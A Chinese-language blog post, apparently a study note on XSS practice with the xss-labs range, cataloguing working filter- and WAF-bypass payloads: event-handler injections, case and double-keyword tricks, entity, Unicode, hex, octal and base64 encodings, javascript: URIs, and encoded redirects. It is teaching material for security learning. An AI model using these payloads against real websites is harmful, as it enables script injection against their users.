+          <article class="post-content mx-auto">
+            <h1 id="seo-header">xss各种姿势的学习</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2025年6月27日 中午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>靶场搭建</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/do0dl3/xss-labs">靶场下载地址：https://github.com/do0dl3/xss-labs</a></p>
+</blockquote>
+<p>搭建很简单，这里就不讲了。</p>
+<blockquote>
+<p>这里也可以像我一样直接用别人搭建好的公共靶场：<a target="_blank" rel="noopener" href="https://xssaq.com/%E3%80%82%E8%BF%9B%E5%85%A5%E7%84%B6%E5%90%8E%E7%82%B9%E5%87%BB%60%E6%B8%B8%E6%88%8F%E6%8C%91%E6%88%98%60%E5%8D%B3%E5%8F%AF%E3%80%82%E4%B8%8D%E8%BF%87%E5%9B%A0%E4%B8%BA%E6%98%AF%E5%88%AB%E4%BA%BA%E6%90%AD%E8%BD%BD%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%8C%E6%9C%89%E5%8F%AF%E8%83%BD%E4%BC%9A%E6%9C%89%E5%8A%A0%E8%BD%BD%E8%BF%87%E6%85%A2%E7%AD%89%E7%AD%89%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%8C%E6%89%80%E4%BB%A5%E5%BB%BA%E8%AE%AE%E8%BF%98%E6%98%AF%E6%90%AD%E5%9C%A8%E6%9C%AC%E5%9C%B0%E7%BB%83%E4%B9%A0%E3%80%82">https://xssaq.com/。进入然后点击`游戏挑战`即可。不过因为是别人搭载的服务器，有可能会有加载过慢等等的问题，所以建议还是搭在本地练习。</a></p>
+</blockquote>
+<h1 id="个人重要总结"><a href="#个人重要总结" class="headerlink" title="个人重要总结"></a>个人重要总结</h1><h3 id="第一点：F12查看网络中的响应包、右键查看页面源代码和F12查看元素的区别"><a href="#第一点：F12查看网络中的响应包、右键查看页面源代码和F12查看元素的区别" class="headerlink" title="第一点：F12查看网络中的响应包、右键查看页面源代码和F12查看元素的区别"></a>第一点：F12查看网络中的响应包、右键查看页面源代码和F12查看元素的区别</h3><p>先来看F12查看网络中的响应包、右键查看页面源代码和F12查看元素的区别：</p>
+<p>F12查看网络中的响应包：</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/001-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>右键查看页面源代码：</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/002-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>上面这两个都是一样的，查看的都是最原始的页面源代码。其中能正确判断闭合是用<code>&#39;</code>单引号还是<code>&quot;</code>双引号，输出点有没有被实体编码等等；</p>
+<p>F12查看元素：这种无法正确判断闭合是用<code>&#39;</code>单引号还是<code>&quot;</code>双引号，输出点有没有被实体编码</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/003-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>所以这里总结出来一点，就是xss的时候，先输入<code>&lt;a&gt;666&lt;/a&gt;</code>(用<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>来判断容易被发现)，然后优先看右键点击查看页面源代码，先判断闭合是要用<code>&#39;</code>单引号还是<code>&quot;</code>双引号，输出点有没有被实体编码等等，因为这个是最原始的页面源代码，也可以F12查看网络里的响应包，这两种是一样的；而F12查看元素是源代码 + 网页js渲染，有点不太一样，不是最原始的页面源代码。不过有时候这两个得结合在一起看。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">右键查看页面源代码或F12查看网络中的响应包：就是别人服务器发送到浏览器的原封不动的代码，也就是最原始的代码。<br><br>(F12)检查元素：看到的就是最终的html代码。即：源代码 + 网页js渲染 。<br><br>【注】在源代码中找不到的代码，是在浏览器执行js动态生成的。<br></code></pre></td></tr></table></figure>
+
+<p>优先看右键点击查看页面源代码的原因：</p>
+<p>这个是最原始的页面源代码。像level 3中value在F12中是<code>&quot;</code>双引号闭合，而右键查看却是<code>&#39;</code>单引号闭合，结果是<code>&#39;</code>单引号闭合最后能成功；还有被实体编码了也是右键查看才能看的出来。</p>
+<p>根据这些种种原因，还是优先看右键点击查看源代码的页面源代码，先把上面这些判断清楚，然后次看F12查看元素。不过有时候这两个得结合在一起看。</p>
+<h3 id="第二点：属性的属性值是否要加引号"><a href="#第二点：属性的属性值是否要加引号" class="headerlink" title="第二点：属性的属性值是否要加引号"></a>第二点：属性的属性值是否要加引号</h3><p>属性名，像事件属性，比如<code>onclick</code>,<code>onerror</code>这样的，它们后面的属性值的引号可加可不加。比如<code>onerror=alert(1)</code>和<code>onerror=&quot;alert(1)&quot;</code>都是可行的。不过如果没有把引号给过滤掉，能加最好还是要加。</p>
+<p>而<code>src</code>属性的属性值要加引号，但是也不是必须的。像level 15关的<code>src</code>属性的属性值就必须要加引号才能成功；而像<code>&lt;ImG sRc=1 onerRor=alert(1);&gt;</code>这样在有的场合也能成功。所以一切还是要具体情况具体分析吧。</p>
+<h3 id="第三点：属性的属性值要加引号的话，引号不能重复"><a href="#第三点：属性的属性值要加引号的话，引号不能重复" class="headerlink" title="第三点：属性的属性值要加引号的话，引号不能重复"></a>第三点：属性的属性值要加引号的话，引号不能重复</h3><p>举例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;img src=&quot;x&quot; onerror=&quot;alert(&quot;1&quot;)&quot;;&gt;不行，<br>&lt;img src=&quot;x&quot; onerror=&#x27;alert(&quot;1&quot;)&#x27;;&gt;可以<br></code></pre></td></tr></table></figure>
+
+<h3 id="第四点：单引号、双引号和反引号"><a href="#第四点：单引号、双引号和反引号" class="headerlink" title="第四点：单引号、双引号和反引号"></a>第四点：单引号、双引号和反引号</h3><p>如果是在html标签中，我们可以不用引号；如果是在javascript的函数中，我们可以用反引号代替单双引号。</p>
+<p>举例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;img src=&quot;1&quot; onerror=alert(1);&gt;可以，<br>&lt;img src=`1` onerror=alert(1);&gt;不行；<br><br>&lt;img src=&quot;1&quot; onerror=&#x27;alert(1)&#x27;;&gt;可以，<br>&lt;img src=&quot;1&quot; onerror=`alert(1)`;&gt;不行；<br><br>&lt;img src=&quot;x&quot; onerror=alert(&#x27;1&#x27;);&gt;可以，<br>&lt;img src=&quot;x&quot; onerror=alert(`1`);&gt;可以；<br></code></pre></td></tr></table></figure>
+
+<h3 id="第五点：Javascript引擎特性和js代码中需要注意的点"><a href="#第五点：Javascript引擎特性和js代码中需要注意的点" class="headerlink" title="第五点：Javascript引擎特性和js代码中需要注意的点"></a>第五点：Javascript引擎特性和js代码中需要注意的点</h3><p>js代码中，利用<code>空格</code>，<code>回车</code>，<code>tab键</code>，切记只有<code>&quot;&quot;</code>包裹的js代码才可以随便利用<code>空格</code>，<code>回车</code>，<code>tab键</code>，比如<code>src=&quot;java script:xxxx&quot;</code>，而这样不行：<code>src=java script:xxxx</code>。而且<code>回车</code>、<code>换行</code>不支持在<code>on事件</code>中使用，<code>空格</code>可以</p>
+<p>Javascript引擎特性：Javascript语句通常以分号结尾，但是如果引擎判断一条语句完整的话，且结尾有换行符，就可以省略分号。</p>
+<p>例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">var a = 1<br>var b = 2;<br>//上述语句都正确<br></code></pre></td></tr></table></figure>
+
+<h1 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h1><p>这里总结了些绕过姿势，无论在实战还是靶场中的学习都能用上。也可以看看这两篇文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_50464560/article/details/114491500">XSS过滤绕过速查表</a>，<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_50464560/article/details/119295255">XSS之绕过简单WAF总结</a></p>
+<h2 id="尖括号被HTML实体编码的情况"><a href="#尖括号被HTML实体编码的情况" class="headerlink" title="尖括号被HTML实体编码的情况"></a>尖括号被HTML实体编码的情况</h2><h3 id="onmouseover事件-当鼠标指针移动到指定对象的时候触发js"><a href="#onmouseover事件-当鼠标指针移动到指定对象的时候触发js" class="headerlink" title="onmouseover事件-当鼠标指针移动到指定对象的时候触发js"></a>onmouseover事件-当鼠标指针移动到指定对象的时候触发js</h3><pre><code class="hljs">&#39;+οnmοuseοver=&#39;javascript:alert(1)
+</code></pre>
+<h3 id="onblur事件-事件会在对象失去焦点时触发js"><a href="#onblur事件-事件会在对象失去焦点时触发js" class="headerlink" title="onblur事件-事件会在对象失去焦点时触发js"></a>onblur事件-事件会在对象失去焦点时触发js</h3><pre><code class="hljs">&#39;+onblur=javascript:alert(1)
+</code></pre>
+<h3 id="onclick事件-当按钮被点击的时候触发js"><a href="#onclick事件-当按钮被点击的时候触发js" class="headerlink" title="onclick事件-当按钮被点击的时候触发js"></a>onclick事件-当按钮被点击的时候触发js</h3><pre><code class="hljs">&#39;+οnclick=&#39;alert(1)//
+&#39;+onclick=&#39;javascript:alert(2)
+</code></pre>
+<h3 id="onfocus事件-当鼠标点击输入框且输入框被选中可以输入内容的时候触发js"><a href="#onfocus事件-当鼠标点击输入框且输入框被选中可以输入内容的时候触发js" class="headerlink" title="onfocus事件-当鼠标点击输入框且输入框被选中可以输入内容的时候触发js"></a>onfocus事件-当鼠标点击输入框且输入框被选中可以输入内容的时候触发js</h3><pre><code class="hljs">&#39;+οnfocus=&#39;alert(1)
+&#39;+onfocus=&#39;javascript:alert(2)
+</code></pre>
+<p>。。。</p>
+<p>更多可以参考：<a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/dom-obj-event.html">菜鸟教程-HTML DOM 事件</a></p>
+<h2 id="空格被过滤的情况"><a href="#空格被过滤的情况" class="headerlink" title="空格被过滤的情况"></a>空格被过滤的情况</h2><hr>
+<h3 id="用-代替空格"><a href="#用-代替空格" class="headerlink" title="用/代替空格"></a>用<code>/</code>代替空格</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;img/src=&quot;1&quot;/onerror=alert(1);&gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="用回车符CR-0d-和换行符LF-0a-取代空格"><a href="#用回车符CR-0d-和换行符LF-0a-取代空格" class="headerlink" title="用回车符CR(%0d) 和换行符LF(%0a)取代空格"></a>用回车符CR(%0d) 和换行符LF(%0a)取代空格</h3><p>在HTML中<code>%0a</code>和<code>%0d</code>是可以当成空格使用的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;img%0asrc=&#x27;1&#x27;%0donerror=alert(1);&gt;<br></code></pre></td></tr></table></figure>
+
+<h2 id="关键字被过滤的情况"><a href="#关键字被过滤的情况" class="headerlink" title="关键字被过滤的情况"></a>关键字被过滤的情况</h2><hr>
+<h3 id="用标签"><a href="#用标签" class="headerlink" title="用&lt;svg&gt;标签"></a>用<code>&lt;svg&gt;</code>标签</h3><blockquote>
+<p>(个人感觉比较少被过滤,起码比<code>&lt;script&gt;</code>标签少)</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;svg onload=&quot;alert(1)&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<p>基于像<code>&lt;script&gt;</code>标签这样被过滤的情况。<code>&lt;img&gt;</code>标签配合事件也行，不过基本都是配合<code>onerror</code>事件属性，别的事件更难触发，像<code>onclick</code>事件要触发还需要受害者点击等等，如果<code>onerror</code>事件属性被过滤了再考虑使用。下面也有大量用到。</p>
+<h3 id="注释符干扰绕过"><a href="#注释符干扰绕过" class="headerlink" title="注释符干扰绕过"></a>注释符干扰绕过</h3><p>html中的注释标签<code>&lt;!-- 在此处写注释 --&gt;</code>用于在 HTML 插入注释。</p>
+<p>例如：<code>&lt;!-- 在此处写注释 --&gt;</code></p>
+<p>绕过例子：</p>
+<p><code>&lt;scri&lt;!--test--&gt;pt&gt;alert(&quot;hello world!&quot;)&lt;/scri&lt;!--test--&gt;pt&gt;</code></p>
+<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;ImG sRc=1 onerRor=alert(1);&gt;<br><br>&lt;SvG OnlOad=&quot;alert(1)&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="双写关键字（有限制）"><a href="#双写关键字（有限制）" class="headerlink" title="双写关键字（有限制）"></a>双写关键字（有限制）</h3><p>有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字来绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;imimgg srsrcc=x onerror=alert(&quot;xss&quot;);&gt;<br></code></pre></td></tr></table></figure>
+
+<p>先判断哪些关键字被过滤，然后再试试双写它。还是要具体情况具体分析吧，如果waf不是只替换一次且是替换为空，可能就不行了</p>
+<h3 id="字符拼接"><a href="#字符拼接" class="headerlink" title="字符拼接"></a>字符拼接</h3><p>利用<code>eval</code>，这里反引号也可以用单引号、双引号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;img src=&quot;x&quot; onerror=&quot;a=`aler`;b=`t`;c=&#x27;(1);&#x27;;eval(a+b+c)&quot;&gt;<br><br>&lt;svg onload=&quot;a=`aler`;b=`t`;c=&#x27;(1);&#x27;;eval(a+b+c)&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<p>利用<code>top</code>，这里反引号也可以用单引号、双引号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;script&gt;top[`al`+`ert`](1);&lt;/script&gt;<br><br>&lt;img src=&quot;x&quot; onerror=&quot;top[&#x27;al&#x27;+&#x27;ert&#x27;](1);&quot;&gt;<br><br>&lt;svg onload=&#x27;top[&quot;al&quot;+&quot;ert&quot;](1);&#x27;&gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="其它字符混淆"><a href="#其它字符混淆" class="headerlink" title="其它字符混淆"></a>其它字符混淆</h3><p>有的waf可能是用正则表达式去检测是否有xss攻击，如果我们能fuzz出正则的规则，那么我们就可以使用其它字符去混淆我们注入的代码了。<br>下面举几个简单的例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">可利用注释、标签的优先级等<br>1.&lt;&lt;script&gt;alert(1);//&lt;&lt;/script&gt;<br>2.&lt;title&gt;&lt;img src=&lt;/title&gt;&gt;&lt;img src=x onerror=&quot;alert(`xss`);&quot;&gt; //因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效<br>3.&lt;SCRIPT&gt;var a=&quot;\\&quot;;alert(1);//&quot;;&lt;/SCRIPT&gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><h4 id="编码工具"><a href="#编码工具" class="headerlink" title="编码工具"></a>编码工具</h4><p>这里推荐几个编码的网址：</p>
+<p><a target="_blank" rel="noopener" href="http://ctf.ssleye.com/">CTF编码</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/zifushiti.php">HTML字符实体转换</a></p>
+<p>以下的payload都是实现弹窗，在用之前可自行在靶场判断是否可行。</p>
+<h4 id="HTML实体编码绕过"><a href="#HTML实体编码绕过" class="headerlink" title="HTML实体编码绕过"></a>HTML实体编码绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">10进制实体编码：<br>&lt;img src=1 onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;&gt;<br><br>16进制实体编码：<br>&lt;img src=1 onerror=&quot;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x22;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x22;&amp;#x29;&amp;#x3B;&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<h4 id="Unicode编码绕过"><a href="#Unicode编码绕过" class="headerlink" title="Unicode编码绕过"></a>Unicode编码绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;img src=&#x27;a&#x27; onerror=&quot;eval(&#x27;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#x27;)&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<h4 id="escape编码绕过"><a href="#escape编码绕过" class="headerlink" title="escape编码绕过"></a>escape编码绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;img src=&quot;a&quot; onerror=&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<h4 id="ASCII码绕过"><a href="#ASCII码绕过" class="headerlink" title="ASCII码绕过"></a>ASCII码绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;img src=&quot;b&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<h4 id="十六进制编码绕过"><a href="#十六进制编码绕过" class="headerlink" title="十六进制编码绕过"></a>十六进制编码绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;img src=x onerror=eval(&#x27;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#x27;)&gt;<br></code></pre></td></tr></table></figure>
+
+<p>这里就是普通的十六进制编码转换，像<code>61</code>就是<code>a</code>转换过来的,<code>6c</code>是<code>l</code>,<code>65</code>是<code>e</code>，依次下去就是<code>alert(&#39;xss&#39;)</code>。只不过每个前面都要加<code>\x</code>，因为Javascript里<code>\x</code>开头的通常是16进制编码的数据。这里注意<code>\x</code>的<code>x</code>是小写不能大写。</p>
+<h4 id="八进制编码绕过"><a href="#八进制编码绕过" class="headerlink" title="八进制编码绕过"></a>八进制编码绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;script&gt;eval(&quot;\141\154\145\162\164\50\57\170\163\163\57\51&quot;);&lt;/script&gt; <br></code></pre></td></tr></table></figure>
+
+<p>这里转换的也是<code>alert(&#39;xss&#39;)</code>。具体过程是先将<code>a</code>转换ASCII码十进制为97，再转换成8进制就为141了。记得141前面要加<code>\</code>，因为Javascript里<code>\</code>开头的通常是8进制编码的数据。后面依此类推。</p>
+<h4 id="base64绕过"><a href="#base64绕过" class="headerlink" title="base64绕过"></a>base64绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;img&gt;标签举例：<br>&lt;img src=&quot;c&quot; onerror=&quot;eval(atob(&#x27;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#x27;))&quot;&gt;   //原payload为document.location=&#x27;http://www.baidu.com&#x27;<br><br>&lt;img src=&quot;c&quot; onerror=&quot;eval(atob(&#x27;YWxlcnQoInhzcyIp&#x27;))&quot;&gt;<br><br>&lt;iframe&gt;标签举例：<br>&lt;iframe/src=data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&gt;&lt;/iframe&gt;<br><br>&lt;object&gt;标签举例：<br>&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;img&lt;/object&gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="Javascript伪协议的使用"><a href="#Javascript伪协议的使用" class="headerlink" title="Javascript伪协议的使用"></a>Javascript伪协议的使用</h3><p>例子：<code>&lt;table background=&quot;javascript:alert(1)&quot;&gt;&lt;/table&gt;</code>。其中引号可以去掉<br>支持Javascript伪协议的属性有：<code>img</code>,<code>href</code>,<code>lowsrc</code>,<code>bgsound</code>,<code>background</code>,<code>action</code>,<code>dynsrc</code></p>
+<h3 id="包裹的js代码利用空格、回车、tab键"><a href="#包裹的js代码利用空格、回车、tab键" class="headerlink" title="&quot;&quot;包裹的js代码利用空格、回车、tab键"></a><code>&quot;&quot;</code>包裹的js代码利用空格、回车、tab键</h3><p>js代码中，利用<code>空格</code>，<code>回车</code>，<code>tab键</code>，切记只有<code>&quot;&quot;</code>包裹的js代码才可以随便利用<code>空格</code>，<code>回车</code>，<code>tab键</code>，比如<code>src=&quot;java script:xxxx&quot;</code>，而这样不行：<code>src=java script:xxxx</code>。而且<code>回车</code>、<code>换行</code>不支持在<code>on事件</code>中使用，<code>空格</code>可以</p>
+<p>Javascript引擎特性：Javascript语句通常以分号结尾，但是如果引擎判断一条语句完整的话，且结尾有换行符，就可以省略分号。</p>
+<p>例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">var a = 1<br>var b = 2;<br>//上述语句都正确<br></code></pre></td></tr></table></figure>
+
+<p>示例：<code>&lt;img src=&quot;javas cript:alert(1)&quot;&gt;</code>,中间为<code>tab键</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">用于绕过某些XSS防护<br>&lt;img src=&quot;jav   ascript:alert(&#x27;XSS&#x27;);&quot;&gt;<br><br>    也可以对TAB编码<br>&lt;img src=&quot;jav&amp;#x09;ascript:alert(&#x27;XSS&#x27;);&quot;&gt;<br><br>    利用换行符拆解<br>&lt;img src=&quot;jav&amp;#x0A;ascript:alert(&#x27;XSS&#x27;);&quot;&gt;<br><br>    利用回车拆解<br>&lt;img src=&quot;jav&amp;#x0D;ascript:alert(&#x27;XSS&#x27;);&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<h2 id="双引号、单引号被过滤的情况"><a href="#双引号、单引号被过滤的情况" class="headerlink" title="双引号、单引号被过滤的情况"></a>双引号、单引号被过滤的情况</h2><hr>
+<h3 id="用反引号绕过"><a href="#用反引号绕过" class="headerlink" title="用反引号绕过"></a>用反引号绕过</h3><p>如果是在html标签中，我们可以不用引号；如果是在javascript的函数中，我们可以用反引号代替单双引号。</p>
+<p>举例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;img src=&quot;1&quot; onerror=alert(1);&gt;可以，<br>&lt;img src=`1` onerror=alert(1);&gt;不行；<br><br>&lt;img src=&quot;1&quot; onerror=&#x27;alert(1)&#x27;;&gt;可以，<br>&lt;img src=&quot;1&quot; onerror=`alert(1)`;&gt;不行；<br><br>&lt;img src=&quot;x&quot; onerror=alert(&#x27;1&#x27;);&gt;可以，<br>&lt;img src=&quot;x&quot; onerror=alert(`1`);&gt;可以；<br></code></pre></td></tr></table></figure>
+
+<p>反引号绕过的例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;img src=&quot;x&quot; onerror=alert(`xss`);&gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="编码绕过（具体看上面的）"><a href="#编码绕过（具体看上面的）" class="headerlink" title="编码绕过（具体看上面的）"></a>编码绕过（具体看上面的）</h3><p>使用编码绕过，具体看上面列举的那些，这里就不再赘述了</p>
+<h2 id="括号被过滤的情况"><a href="#括号被过滤的情况" class="headerlink" title="括号被过滤的情况"></a>括号被过滤的情况</h2><hr>
+<h3 id="用throw来绕过"><a href="#用throw来绕过" class="headerlink" title="用throw来绕过"></a>用<code>throw</code>来绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;svg/onload=&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="url地址被过滤的情况"><a href="#url地址被过滤的情况" class="headerlink" title="url地址被过滤的情况"></a>url地址被过滤的情况</h2><hr>
+<h3 id="使用url编码"><a href="#使用url编码" class="headerlink" title="使用url编码"></a>使用url编码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;img src=&quot;x&quot; onerror=document.location=`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`&gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="使用IP地址"><a href="#使用IP地址" class="headerlink" title="使用IP地址"></a>使用IP地址</h3><p>以下都是跳转到<code>http://127.0.0.1</code>，需要用到这个：<a target="_blank" rel="noopener" href="http://ip.chacuo.net/ipcalc?_t=b1561938109">IP地址计算器</a></p>
+<p>下图是十六进制IP和十进制IP的绕过，十六进制IP加个<code>0x</code>：</p>
+<p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/004-image.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>1.十进制IP</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;img src=&quot;x&quot; onerror=document.location=`http://2130706433/`&gt;<br></code></pre></td></tr></table></figure>
+
+<p>2.八进制IP</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;img src=&quot;x&quot; onerror=document.location=`http://0177.0.0.01/`&gt;<br></code></pre></td></tr></table></figure>
+
+<p>3.十六进制IP</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;img src=&quot;x&quot; onerror=document.location=`http://0x7f.0x0.0x0.0x1/`&gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="用-代替http"><a href="#用-代替http" class="headerlink" title="用//代替http://"></a>用<code>//</code>代替<code>http://</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;img src=&quot;x&quot; onerror=document.location=`//www.baidu.com`&gt;<br></code></pre></td></tr></table></figure>
+
